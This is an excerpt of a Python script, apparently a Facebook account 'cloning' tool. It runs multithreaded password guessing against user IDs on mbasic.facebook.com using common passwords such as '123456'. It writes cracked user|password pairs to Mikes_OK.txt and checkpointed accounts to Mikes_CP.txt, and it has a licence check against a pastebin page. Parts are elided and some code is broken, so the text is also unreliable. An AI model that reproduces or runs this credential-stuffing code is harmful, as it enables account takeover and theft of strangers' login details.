...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mMikes_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mMikes_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Mikes Menu ")
	    Sad_Boy()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[Mikes] {loop}|{len(self.id)} [OK][{len(ok)}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
              ...
              "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Mikes-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Mikes_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [Mikes-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Mikes_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with javed(max_workers=30) as Mikesworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = ["123456"]
                            pwx = ["123456789"]
                        Mikesworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
...
def reg():
  ...
  print('')
  uuid = str(os.getpid())
  id = "NGM2OTZlNzU3".join(uuid)
  try:
    httpCaht = requests.get('https://pastebin.com/raw/esgRr5Yw').text
    if id in httpCaht:
      ...
      print(" [+] File Cloning")
      print(" [+] Exit")
      print("\x1b[37;1mYour Licences :\033[1;92m "+id)
      print('')
      print("\x1b[1;97mCopy Token and Press Enter")
      os.system('xdg-open https://wa.me/+95648563')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
